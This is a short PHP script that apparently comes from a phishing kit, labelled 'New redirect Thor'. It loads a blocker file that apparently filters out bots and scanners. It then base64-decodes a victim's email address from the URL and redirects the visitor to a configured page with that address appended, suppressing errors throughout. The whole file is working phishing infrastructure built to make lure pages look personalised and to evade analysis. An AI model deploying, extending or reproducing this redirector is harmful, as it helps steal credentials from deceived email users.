<?php /*  New redirect Thor: ########@#####.com ########@#####: ########@##### ########@##### */ error_reporting(
    0
);
include "blocker.php";
include "config.php";
preg_match("/[^\/]+$/", urldecode($_SERVER["REQUEST_URI"]), $matches);
$data = $matches[0];
function begnWith($str, $begnString)
{
    $len = strlen($begnString);
    return substr($str, 0, $len) === $begnString;
}
if (begnWith($data, "?")) {
    $data = ltrim($data, "?");
}





// if (base64_encode(base64_decode($data)) === $data) {
//     $email = filter_var(base64_decode($data), FILTER_SANITIZE_EMAIL);
//     if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
//         if ($redirecttype == 1 || $redirecttype == "1") {
//             header("Location: " . $FailRedirect);
//         } else {
//             echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";
//         }
//         die();
//     } else {
//         $email = $data;
//     }
// } elseif (filter_var($data, FILTER_VALIDATE_EMAIL)) {
//     $email = $data;
// } else {
//     if ($redirecttype == 1 || $redirecttype == "1") {
//         header("Location: " . $FailRedirect);
//     } else {
//         echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";
//     }
//     die();
// }


    // if ($redirecttype == 1 || $redirecttype == "1") {
    //     header("Location: " . $FailRedirect);
    // } else {
    //     echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";
    // }

    $email = filter_var(base64_decode($data), FILTER_SANITIZE_EMAIL);
    
if ($redirecttype == 1 || $redirecttype == "1") {
    header("Location: " . $pagelink . "" . $email);
} else {
    echo "<script type=\"text/javascript\">window.location.href = \"$pagelink$email\"</script>\n";
}
die(); 

?>
